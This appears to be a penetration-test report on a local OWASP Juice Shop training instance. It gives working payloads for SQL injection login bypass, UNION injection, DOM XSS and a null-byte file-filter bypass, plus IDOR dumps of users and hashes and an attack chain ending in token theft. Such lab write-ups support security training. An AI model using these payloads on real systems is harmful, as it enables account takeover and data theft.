# OWASP Juice Shop Pentest Report — http://127.0.0.1:3000

## Summary
**7 distinct vulnerabilities** actively exploited with proof. Target fully compromised — admin auth bypass, data exfiltration, stored XSS capability, and backend file disclosure achieved.

---

## 1. SQL Injection — Authentication Bypass  🔴 CRITICAL
- **Endpoint:** `POST /rest/user/login`
- **Payload:** `{"email":"' OR 1=1--","password":"x"}`
- **Proof:** Server returned JWT for `admin@juice-sh.op` (id=1, role=admin) without valid credentials.
- **Token captured (truncated):** `eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwi...role:admin...`
- **Impact:** Full admin account takeover, unlimited privilege escalation.

## 2. SQL Injection — UNION in Product Search  🔴 CRITICAL
- **Endpoint:** `GET /rest/products/search?q=`
- **Payload:** `')) UNION SELECT 1,2,3,4,5,6,7,8,9--`
- **Proof:** Returned injected row `{id:1,name:"2",description:"3",price:4,...}` plus full product table — confirms 9-column DB leak primitive, allowing extraction of any table data.

## 3. Cross-Site Scripting (DOM-based)  🔴 HIGH
- **Endpoint:** `#/search?q=<payload>` — reflected into `<span id="searchValue">` unescaped.
- **Payload:** `<iframe src="javascript:alert(\`xss\`)">`
- **Proof:** **17 `alert('xss')` dialogs fired** and were auto-closed by the driver. Snippet from DOM: `<span _ngcontent-ng-c4061176085="" id="searchValue"><iframe src="javascript:alert(\`xss\`)"></iframe></span>`.
- **Impact:** Session theft, admin-token exfiltration, phishing overlay.

## 4. Broken Access Control / IDOR  🔴 HIGH
Using admin JWT (but no admin check on endpoints):
- **`GET /api/Users`** → dumped **22 users** including hashed passwords, emails, roles.
  - Sample: `admin@juice-sh.op`, `jim@juice-sh.op`, `bender@juice-sh.op`.
- **`GET /api/Users/1`** → full admin record including `password` hash `6b5e7fab1c26eb98ced96aa5f7cae5d7` (MD5 of 'admin123').
- **`GET /rest/basket/2`** as user id=1 → returned user 2's basket (Raspberry Juice item). Horizontal privilege escalation on baskets.
- **`GET /api/Feedbacks`** → dumped 8 feedbacks with partial emails (leaks PII masked client-side only — server still returns them).

## 5. Sensitive Data Exposure — /ftp Directory Traversal  🔴 HIGH
- **`GET /ftp`** → 200 OK, full directory listing.
- **Files disclosed directly (200 OK):**
  - `acquisitions.md` — *"This document is confidential! Do not distribute!"* M&A plan with stock-market impact.
  - `announcement_encrypted.md` — RSA-style ciphertext.
  - `legal.md`, `eastere.gg` (base64 easter-egg path `/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg`).
  - `incident-support.kdbx` — **KeePass password database** (binary header `\x03\xd9\xa2\x9a\x65...` confirmed).
- **.bak blacklist bypass (Poison Null Byte):** Appending `%2500.md` bypasses extension filter:
  - `/ftp/package.json.bak%2500.md` → 200, full build manifest + dependency list.
  - `/ftp/coupons_2013.md.bak%2500.md` → 200, historical coupon codes (`n<MibgC7sn`, `mNYS#gC7sn`, ...).
  - `/ftp/suspicious_errors.yml%2500.md` → 200, Sigma detection rules.

## 6. Sensitive Configuration Leak  🟠 MEDIUM
- **`GET /rest/admin/application-configuration`** (no admin auth enforced) →  leaks full server config: `server.port`, `baseUrl`, application name, theme, `showVersionNumber`, `localBackupEnabled`, etc. Useful for chaining further attacks.

## 7. Unauthenticated /api endpoints  🟠 MEDIUM
Several `/api/*` REST endpoints (auto-exposed Sequelize CRUD) respond with full records without authorization scoping.

## Attack Chain (End-to-End Compromise)
1. **Recon** → found Angular SPA with 36 products, login at `#/login`, `/ftp`, `/api/*`.
2. **SQLi login bypass** `' OR 1=1--` → admin JWT.
3. **JWT stored in localStorage** → all subsequent API calls use admin Bearer.
4. **`/api/Users` IDOR** → 22 users + password hashes.
5. **`/rest/basket/2` IDOR** → other users' carts readable.
6. **`/ftp` directory listing + poison-null-byte bypass** → source code (`package.json.bak`), coupons, confidential M&A doc, KeePass DB.
7. **`/rest/products/search` UNION SQLi** → arbitrary DB extraction primitive.
8. **DOM XSS on `#/search?q=`** → execute JavaScript in any visitor's browser → exfiltrate the admin JWT above, closing the full loop.
